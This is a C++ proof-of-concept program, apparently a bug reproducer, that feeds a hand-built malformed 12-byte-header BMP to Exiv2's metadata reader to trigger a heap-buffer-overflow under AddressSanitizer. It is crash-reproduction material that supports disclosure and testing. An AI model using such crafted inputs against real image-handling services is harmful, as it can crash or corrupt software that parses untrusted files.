// PoC: reading a minimal, well-formed OS/2 BITMAPCOREHEADER (12-byte DIB
// header) BMP file through the public Exiv2::Image::readMetadata() API
// triggers a heap-buffer-overflow in BmpImage::readMetadata().
//
// Build (after configuring exiv2 with ASan, e.g. -DEXIV2_TEAM_USE_SANITIZERS=ON):
//   g++ -std=c++17 -fsanitize=address,undefined -Iinclude -Ibuild-asan \
//       pocs/newbug.cpp build-asan/lib/libexiv2.a -lexpat -lbrotlidec -lbrotlicommon \
//       -o /tmp/newbug
// Run:
//   /tmp/newbug   (expect ASan abort, rc 134, on the patched tree)

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

#include <exiv2/basicio.hpp>
#include <exiv2/bmpimage.hpp>
#include <exiv2/image.hpp>

int main() {
  const std::vector<unsigned char> data{
      'B',  'M',               // Signature
      0x1A, 0x00, 0x00, 0x00,  // Size of the BMP file in bytes
      0x00, 0x00,              // Reserved
      0x00, 0x00,              // Reserved
      0x00, 0x00, 0x00, 0x00,  // Offset of pixel data
      0x0C, 0x00, 0x00, 0x00,  // DIB header size = 12 (OS/2 BITMAPCOREHEADER)
      0x10, 0x00,              // width  = 16 (16-bit field)
      0x08, 0x00,              // height = 8  (16-bit field)
      0x01, 0x00,              // planes
      0x18, 0x00,              // bits per pixel
  };

  auto memIo = std::make_unique<Exiv2::MemIo>(data.data(), data.size());
  Exiv2::BmpImage bmp(std::move(memIo), Exiv2::ImageCtorParams{false, 500});
  bmp.readMetadata();

  std::printf("pixelWidth=%u pixelHeight=%u\n", bmp.pixelWidth(), bmp.pixelHeight());
  return 0;
}
